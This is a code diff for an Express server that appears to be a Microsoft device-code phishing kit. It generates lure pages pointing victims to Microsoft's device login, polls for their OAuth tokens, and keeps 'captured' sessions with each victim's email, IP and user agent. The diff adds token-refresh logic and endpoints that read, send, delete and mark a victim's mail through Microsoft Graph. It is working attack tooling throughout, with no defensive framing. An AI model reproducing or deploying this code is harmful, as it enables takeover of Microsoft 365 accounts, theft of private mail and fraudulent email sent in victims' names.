@@ -27,7 +27,41 @@ function getClientIp(req) {
     return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
 }
 
-// Test endpoint
+// ============================================
+// HELPER: Refresh Token
+// ============================================
+async function refreshToken(session) {
+    try {
+        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams({
+                grant_type: 'refresh_token',
+                refresh_token: session.tokens.refresh_token,
+                client_id: YOUR_CLIENT_ID
+            }), {
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+            }
+        );
+        session.tokens.access_token = response.data.access_token;
+        session.tokens.refresh_token = response.data.refresh_token || session.tokens.refresh_token;
+        session.tokens.expires_in = response.data.expires_in;
+        session.tokens.expires_at = Date.now() + (response.data.expires_in * 1000);
+        return session.tokens.access_token;
+    } catch (err) {
+        console.error('Token refresh failed:', err.message);
+        return null;
+    }
+}
+
+async function getValidToken(session) {
+    if (Date.now() >= session.tokens.expires_at - 300000) {
+        return await refreshToken(session);
+    }
+    return session.tokens.access_token;
+}
+
+// ============================================
+// TEST ENDPOINT
+// ============================================
 app.get('/api/test', async (req, res) => {
     try {
         const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
@@ -44,7 +78,9 @@ app.get('/api/test', async (req, res) => {
     }
 });
 
-// Create session
+// ============================================
+// CREATE SESSION (Device Code Flow)
+// ============================================
 app.post('/api/create-session', async (req, res) => {
     try {
         const sid = generateSID();
@@ -132,6 +168,9 @@ async function pollForToken(device_code, sid) {
     }, 3000);
 }
 
+// ============================================
+// SESSION STATUS & MANAGEMENT
+// ============================================
 app.get('/api/status/:sid', async (req, res) => {
     const { sid } = req.params;
     const session = userSessions.get(sid);
@@ -144,7 +183,7 @@ app.get('/api/status/:sid', async (req, res) => {
 
 app.get('/api/sessions', async (req, res) => {
     const sessionList = Array.from(userSessions.values()).map(s => ({
-        sid: s.sid, email: s.email, name: s.name, ip: s.ip, capturedAt: s.capturedAt
+        sid: s.sid, email: s.email, name: s.name, ip: s.ip, userAgent: s.userAgent, capturedAt: s.capturedAt
     }));
     res.json({ sessions: sessionList });
 });
@@ -160,7 +199,144 @@ app.delete('/api/sessions/clear', async (req, res) => {
     res.json({ success: true });
 });
 
-// Generate Auth Page - WITH CORRECT MICROSOFT URL
+// ============================================
+// MAILBOX API ENDPOINTS
+// ============================================
+
+// Get emails from folder
+app.get('/api/mail/:sessionId/:folderId', async (req, res) => {
+    const { sessionId, folderId } = req.params;
+    const { top = 50 } = req.query;
+    
+    const session = userSessions.get(sessionId);
+    if (!session) return res.status(401).json({ error: 'Session not found' });
+    
+    const token = await getValidToken(session);
+    if (!token) return res.status(401).json({ error: 'Token expired' });
+    
+    try {
+        const folderMap = {
+            'inbox': 'inbox',
+            'sent': 'sentitems',
+            'drafts': 'drafts',
+            'deleted': 'deleteditems',
+            'archive': 'archive',
+            'junk': 'junkemail'
+        };
+        const folderPath = folderMap[folderId] || folderId;
+        
+        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderPath}/messages`, {
+            headers: { 'Authorization': `Bearer ${token}` },
+            params: { 
+                '$top': top, 
+                '$orderby': 'receivedDateTime desc', 
+                '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' 
+            }
+        });
+        res.json(response.data);
+    } catch (err) {
+        console.error('Fetch emails error:', err.response?.data);
+        res.status(500).json({ error: 'Failed to fetch emails' });
+    }
+});
+
+// Get single email with full body
+app.get('/api/mail/message/:sessionId/:messageId', async (req, res) => {
+    const { sessionId, messageId } = req.params;
+    const session = userSessions.get(sessionId);
+    if (!session) return res.status(401).json({ error: 'Session not found' });
+    
+    const token = await getValidToken(session);
+    if (!token) return res.status(401).json({ error: 'Token expired' });
+    
+    try {
+        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
+            headers: { 'Authorization': `Bearer ${token}` },
+            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
+        });
+        res.json(response.data);
+    } catch (err) {
+        res.status(500).json({ error: 'Failed to fetch message' });
+    }
+});
+
+// Send email
+app.post('/api/mail/send/:sessionId', async (req, res) => {
+    const { sessionId } = req.params;
+    const { to, subject, body, cc } = req.body;
+    const session = userSessions.get(sessionId);
+    if (!session) return res.status(401).json({ error: 'Session not found' });
+    
+    const token = await getValidToken(session);
+    if (!token) return res.status(401).json({ error: 'Token expired' });
+    
+    try {
+        const emailData = {
+            message: {
+                subject: subject,
+                body: { contentType: 'HTML', content: body },
+                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
+            },
+            saveToSentItems: true
+        };
+        
+        if (cc && cc.length) {
+            emailData.message.ccRecipients = cc.map(email => ({ emailAddress: { address: email } }));
+        }
+        
+        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', emailData, {
+            headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' }
+        });
+        res.json({ success: true });
+    } catch (err) {
+        console.error('Send email error:', err.response?.data);
+        res.status(500).json({ error: 'Failed to send email' });
+    }
+});
+
+// Delete email
+app.delete('/api/mail/message/:sessionId/:messageId', async (req, res) => {
+    const { sessionId, messageId } = req.params;
+    const session = userSessions.get(sessionId);
+    if (!session) return res.status(401).json({ error: 'Session not found' });
+    
+    const token = await getValidToken(session);
+    if (!token) return res.status(401).json({ error: 'Token expired' });
+    
+    try {
+        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
+            headers: { 'Authorization': `Bearer ${token}` }
+        });
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: 'Failed to delete message' });
+    }
+});
+
+// Mark as read/unread
+app.patch('/api/mail/message/:sessionId/:messageId', async (req, res) => {
+    const { sessionId, messageId } = req.params;
+    const { isRead } = req.body;
+    const session = userSessions.get(sessionId);
+    if (!session) return res.status(401).json({ error: 'Session not found' });
+    
+    const token = await getValidToken(session);
+    if (!token) return res.status(401).json({ error: 'Token expired' });
+    
+    try {
+        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
+            { isRead: isRead },
+            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
+        );
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: 'Failed to update message' });
+    }
+});
+
+// ============================================
+// GENERATE AUTH PAGE
+// ============================================
 app.get('/generate-auth-page', async (req, res) => {
     try {
         const sid = generateSID();
@@ -240,7 +416,6 @@ app.get('/generate-auth-page', async (req, res) => {
         alert('✓ Code copied!');
     }
     
-    // FIXED: Using the correct Microsoft login URL
     document.getElementById('openBtn').onclick = function() {
         window.open('https://microsoft.com/devicelogin', '_blank', 'width=600,height=700,resizable=yes');
     };
@@ -271,6 +446,9 @@ app.get('/generate-auth-page', async (req, res) => {
     }
 });
 
+// ============================================
+// DASHBOARD
+// ============================================
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
